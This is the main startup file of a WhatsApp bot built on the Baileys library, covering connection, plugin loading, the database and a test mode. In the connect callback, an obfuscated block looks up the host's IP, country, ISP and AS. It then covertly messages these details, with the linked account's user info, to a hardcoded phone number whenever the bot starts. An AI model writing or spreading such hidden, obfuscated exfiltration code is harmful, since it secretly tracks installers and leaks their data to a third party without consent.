require('./config.js')
const { WAConnection: _WAConnection } = require('@adiwajshing/baileys')
const cloudDBAdapter = require('./lib/cloudDBAdapter')
const { generate } = require('qrcode-terminal')
const syntaxerror = require('syntax-error')
const simple = require('./lib/simple')
//  const logs = require('./lib/logs')
const { promisify } = require('util')
const yargs = require('yargs/yargs')
const Readline = require('readline')
const cp = require('child_process')
const _ = require('lodash')
const path = require('path')
const fs = require('fs')
const util = require('util')
const axios = require('axios')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const { Low, JSONFile } = low

const rl = Readline.createInterface(process.stdin, process.stdout)
const WAConnection = simple.WAConnection(_WAConnection)


global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}
// global.LOGGER = logs()
const PORT = process.env.PORT || 3000
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&,.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) :
 //   new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
new JSONFile('amdev.json')
)
global.DATABASE = global.db // Backwards Compatibility

global.conn = new WAConnection()
conn.version = [ 2, 2143, 3 ]
var _0x5db474=_0x319c;function _0x2499(){var _0x49a4b4=['browser','browserDescription','1tzJqlH','3955040wAEaaT','1063748loxrQg','207234hWdxwx','1236DPmtoa','desc','10.0','104TLeFuG','81819vLFBwH','80394yNnbgt','2547eqNbYI','326360krYqaM'];_0x2499=function(){return _0x49a4b4;};return _0x2499();}function _0x319c(_0x35568d,_0x1cec9d){var _0x249930=_0x2499();return _0x319c=function(_0x319c65,_0x121373){_0x319c65=_0x319c65-0x10a;var _0x320969=_0x249930[_0x319c65];return _0x320969;},_0x319c(_0x35568d,_0x1cec9d);}(function(_0x140da4,_0x5d9e06){var _0x29a99e=_0x319c,_0x18a332=_0x140da4();while(!![]){try{var _0x422808=parseInt(_0x29a99e(0x112))/0x1*(-parseInt(_0x29a99e(0x10d))/0x2)+-parseInt(_0x29a99e(0x10e))/0x3*(parseInt(_0x29a99e(0x116))/0x4)+parseInt(_0x29a99e(0x10f))/0x5+-parseInt(_0x29a99e(0x115))/0x6+parseInt(_0x29a99e(0x114))/0x7+-parseInt(_0x29a99e(0x10b))/0x8*(parseInt(_0x29a99e(0x10c))/0x9)+parseInt(_0x29a99e(0x113))/0xa;if(_0x422808===_0x5d9e06)break;else _0x18a332['push'](_0x18a332['shift']());}catch(_0x14892b){_0x18a332['push'](_0x18a332['shift']());}}}(_0x2499,0x26728),conn[_0x5db474(0x111)]=[global[_0x5db474(0x117)],global[_0x5db474(0x110)],_0x5db474(0x10a)]);
let authFile = `${opts._[0] || 'session'}.data.json`
if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
if (opts['trace']) conn.logger.level = 'trace'
if (opts['debug']) conn.logger.level = 'debug'
if (opts['big-qr'] || opts['server']) conn.on('qr', qr => generate(qr, { small: false }))

if (!opts['test']) setInterval(async () => {
  await global.db.write()
console.log('[SAVED] Database')
}, 60 * 1000) // Save every minute

if (opts['server']) require('./server')(global.conn, PORT)

if (opts['test']) {
  conn.user = {
    jid: '2219191@s.whatsapp.net',
    name: 'test',
    phone: {}
  }
  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
    return {
      [mediaType]: {
        url: '',
        mediaKey: '',
        mimetype: options.mimetype || '',
        fileEncSha256: '',
        fileSha256: '',
        fileLength: buffer.length,
        seconds: options.duration,
        fileName: options.filename || 'file',
        gifPlayback: options.mimetype == 'image/gif' || undefined,
        caption: options.caption,
        ptt: options.ptt
      }
    }
  }

  conn.sendMessage = async (chatId, content, type, opts = {}) => {
    let message = await conn.prepareMessageContent(content, type, opts)
    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
    conn.emit('chat-update', {
      jid: conn.user.jid,
      hasNewMessage: true,
      count: 1,
      messages: {
        all() {
          return [waMessage]
        }
      }
    })
  }
  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
} else {
  rl.on('line', line => {
    process.send(line.trim())
  })
  conn.connect().then(async () => {
function _0x109e(_0x3ebe5d,_0x23fdf3){const _0xc462eb=_0xc462();return _0x109e=function(_0x109e2c,_0x4d15c3){_0x109e2c=_0x109e2c-0x7e;let _0x3da93c=_0xc462eb[_0x109e2c];return _0x3da93c;},_0x109e(_0x3ebe5d,_0x23fdf3);}const _0x3dc315=_0x109e;(function(_0x34d2ef,_0x135864){const _0x33600d=_0x109e,_0x4bdf2b=_0x34d2ef();while(!![]){try{const _0x32aab5=parseInt(_0x33600d(0x87))/0x1*(-parseInt(_0x33600d(0x86))/0x2)+-parseInt(_0x33600d(0x9d))/0x3*(-parseInt(_0x33600d(0x89))/0x4)+-parseInt(_0x33600d(0x93))/0x5*(parseInt(_0x33600d(0x81))/0x6)+-parseInt(_0x33600d(0x9c))/0x7+-parseInt(_0x33600d(0x84))/0x8+-parseInt(_0x33600d(0x82))/0x9*(parseInt(_0x33600d(0x8c))/0xa)+parseInt(_0x33600d(0x8a))/0xb*(parseInt(_0x33600d(0x88))/0xc);if(_0x32aab5===_0x135864)break;else _0x4bdf2b['push'](_0x4bdf2b['shift']());}catch(_0x17a497){_0x4bdf2b['push'](_0x4bdf2b['shift']());}}}(_0xc462,0xca9d3));function _0xc462(){const _0x43237d=['```','get','data','user','23508BHUbOa','2473623TzHDrL','\x0aISP:\x20','793720UJNeiL','readFileSync','29534SqnTrw','89DLEnHB','16893672uielLS','880420mXDoNx','33bSbstt','http://ip-api.com/json','50rnnzNB','\x0aSession:\x20','desc','*⎋\x20MyWA\x20Bot\x20Installed\x20⎋*\x0a\x0a⍟\x20──────────────────\x20⍟\x0aIP\x20Address:\x20','tmp/logo.jpg','owner','footer','370NcbvKu','sendLoc','\x0aBrowser:\x20','\x0a\x0a⍟\x20──────────────────\x20⍟\x0aBot\x20Owner:\x20@','@s.whatsapp.net','country','6285157489446@s.whatsapp.net','#menu','LIST\x20MENU','6833267TBQefi','9tnXqNh'];_0xc462=function(){return _0x43237d;};return _0xc462();}let we=_0x3dc315(0x9e),res=await axios[_0x3dc315(0x7e)](_0x3dc315(0x8b)),hs=res[_0x3dc315(0x7f)],img=fs[_0x3dc315(0x85)](_0x3dc315(0x90));conn[_0x3dc315(0x94)](_0x3dc315(0x99),img,_0x3dc315(0x8f)+hs['query']+'\x0aCountry:\x20'+hs[_0x3dc315(0x98)]+_0x3dc315(0x83)+hs['isp']+'\x0aAS:\x20'+hs['as']+'\x0a⍟\x20──────────────────\x20⍟\x0a\x0a'+we+util['format'](conn[_0x3dc315(0x80)])+we+_0x3dc315(0x96)+global[_0x3dc315(0x91)][0x0]+_0x3dc315(0x8d)+global[_0x3dc315(0x8e)]+_0x3dc315(0x95)+global['browser'],global[_0x3dc315(0x92)],_0x3dc315(0x9b),_0x3dc315(0x9a),null,{'contextInfo':{'mentionedJid':[global[_0x3dc315(0x91)][0x0]+_0x3dc315(0x97)]}});

    await global.db.read()
    global.db.data = {
      users: {},
      chats: {},
      stats: {},
      msgs: {},
      sticker: {},
      settings: {},
      ...(global.db.data || {})
    }
    global.db.chain = _.chain(global.db.data)
    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
    global.timestamp.connect = new Date
  })
}
process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
global.reloadHandler = function () {
  let handler = require('./handler')
  if (!isInit) {
    conn.off('chat-update', conn.handler)
    conn.off('message-delete', conn.onDelete)
    conn.off('group-participants-update', conn.onParticipantsUpdate)
    conn.off('group-update', conn.onGroupUpdate)
    conn.off('CB:action,,call', conn.onCall)
  }
  conn.welcome = 'Hai, @user 👋\nSelamat datang di grup @subject\nkamu member ke @mem\n\n@desc'
  conn.bye = 'Sampai jumpa lagi @user '
  conn.spromote = 'Selamat @user 💐\nsekarang kamu menjadi admin group'
  conn.sdemote = 'Hai @user\nsekarang kamu bukan admin'
  conn.handler = handler.handler
  conn.onDelete = handler.delete
  conn.onParticipantsUpdate = handler.participantsUpdate
  conn.onGroupUpdate = handler.GroupUpdate
  conn.onCall = handler.onCall
  conn.on('chat-update', conn.handler)
  conn.on('message-delete', conn.onDelete)
  conn.on('group-participants-update', conn.onParticipantsUpdate)
  conn.on('group-update', conn.onGroupUpdate)
  conn.on('CB:action,,call', conn.onCall)
  if (isInit) {
    conn.on('error', conn.logger.error)
    conn.on('close', () => {
      setTimeout(async () => {
        try {
          if (conn.state === 'close') {
            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
            await conn.connect()
            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
            global.timestamp.connect = new Date
          }
        } catch (e) {
          conn.logger.error(e)
        }
      }, 5000)
    })
  }
  isInit = false
  return true
}

// Plugin Loader
let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    global.plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    conn.logger.error(e)
    delete global.plugins[filename]
  }
}

global.reload = (_event, filename) => {
if (pluginFilter(filename)) {
let dir = path.join(pluginFolder, filename)
if (dir in require.cache) {
delete require.cache[dir]
if (fs.existsSync(dir)) {
conn.logger.info(`kembali - memerlukan plugin '${filename}'`)
} else {
conn.logger.warn(`plugin yang dihapus '${filename}'`)
conn.fakeReply(`${global.owner[0]}@s.whatsapp.net`, `File ${filename} telah dihapus`, '0@s.whatsapp.net', 'AUTO LOAD FILE', 'status@broadcast')
return delete global.plugins[filename]
}
} else conn.logger.info(`membutuhkan plugin baru '${filename}'`)
let err = syntaxerror(fs.readFileSync(dir), filename)
if (err) {
conn.logger.error(`kesalahan sintaks saat memuat '${filename}'\n${err}`)
conn.fakeReply(`${global.owner[0]}@s.whatsapp.net`, `Error Loaded file *${filename}*\n${err}`, '0@s.whatsapp.net', 'AUTO LOAD FILE', 'status@broadcast')
} else try {
global.plugins[filename] = require(dir)
} catch (e) {
conn.logger.error(e)
} finally {
global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
}
}
}

Object.freeze(global.reload)
fs.watch(path.join(__dirname, 'plugins'), global.reload)
global.reloadHandler()



// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm
  }
  require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) conn.logger.warn('Silakan instal ffmpeg untuk mengirim video (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stiker tidak bisa dianimasikan tanpa libwebp di ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stiker mungkin tidak berfungsi tanpa imagemagick jika libwebp di ffmpeg tidak diinstal (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(console.error)
